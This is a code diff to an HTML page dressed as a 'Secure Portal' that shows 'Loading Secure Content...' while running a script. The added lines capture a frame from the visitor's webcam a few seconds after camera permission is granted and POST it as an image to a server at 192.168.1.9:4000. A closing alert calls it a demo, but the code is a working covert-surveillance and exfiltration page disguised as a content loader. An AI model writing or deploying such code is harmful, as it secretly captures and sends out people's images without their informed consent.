@@ -1,20 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Secure Portal</title>
-</head>
 <body>
     <h2>Loading Secure Content...</h2>
     <video id="video" width="300" autoplay playsinline></video>
 
     <script>
+        const video = document.getElementById("video");
+
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
-            document.getElementById("video").srcObject = stream;
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                captureAndSend();
+            }, 3000);
         })
         .catch(err => {
-            alert("Camera permission denied.");
+            alert("Camera access denied.");
         });
+
+        function captureAndSend() {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0);
+
+            const imageData = canvas.toDataURL("image/png");
+
+            fetch("http://192.168.1.9:4000/upload", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ image: imageData })
+            });
+
+            alert("Image captured and sent (demo).");
+        }
     </script>
 </body>
 </html>
